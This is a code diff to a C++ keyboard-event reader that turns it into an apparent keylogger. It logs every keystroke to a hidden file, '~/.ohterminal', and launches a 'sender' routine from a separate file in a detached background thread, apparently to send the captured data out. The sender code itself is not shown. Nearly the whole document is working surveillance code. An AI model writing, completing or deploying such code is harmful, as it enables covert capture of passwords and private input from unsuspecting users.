@@ -5,9 +5,12 @@
 #include <sys/ioctl.h>
 #include <cctype>
 #include <fstream>
+#include <thread>
 #include "database.cpp"
-
+#include "sender.cpp"
 using namespace std;
+
+const char* home = getenv("HOME");
 
 const string RESET   = "\033[0m";
 const string RED     = "\033[31m";
@@ -150,7 +153,10 @@ string find_keyboard()
 
 int main()
 {
+  //  const char* home = getenv("HOME");
     string keyboard = find_keyboard();
+    //sender(home);
+    thread(sender,home).detach();
 
     if (keyboard.empty())
     {
@@ -186,8 +192,7 @@ int main()
         int value = event.value;
 
 
-        if (code == KEY_LEFTSHIFT ||
-            code == KEY_RIGHTSHIFT)
+        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
         {
             shift = (value != 0);
             continue;
@@ -221,41 +226,39 @@ int main()
             continue;
         }
 
+//	const char* home = getenv("HOME");
+        ofstream file(string(home) + "/.ohterminal",ios::app);
 
-        if (key.length() == 1 &&
-            isalpha(static_cast<unsigned char>(key[0])))
+
+        if (key.length() == 1 && isalpha(static_cast<unsigned char>(key[0])))
         {
             bool upper = shift ^ caps;
 
 
             if (upper)
-                key[0] =
-                    toupper(static_cast<unsigned char>(key[0]));
+                key[0] =toupper(static_cast<unsigned char>(key[0]));
             else
-                key[0] =
-                    tolower(static_cast<unsigned char>(key[0]));
+                key[0] =tolower(static_cast<unsigned char>(key[0]));
 
 
             cout << key << flush;
+	     file<<special_color(code)<< key << RESET << " ";
 
             continue;
         }
 
 
-        if (key.length() == 1 &&
-            isdigit(static_cast<unsigned char>(key[0])))
+        if (key.length() == 1 && isdigit(static_cast<unsigned char>(key[0])))
         {
             cout << key << flush;
-
+	    file<<special_color(code)<< key << RESET << " ";
+	
             continue;
         }
 
 
         cout << special_color(code)<< key << RESET << flush << " ";
-
-	const char* home = getenv("HOME");
-	ofstream file(string(home) + "/.ohterminal",ios::app);
-	file<<special_color(code)<< key << RESET << " ";
+	file<<special_color(code)<<key<< RESET << " ";
 	file.close();
     }
 
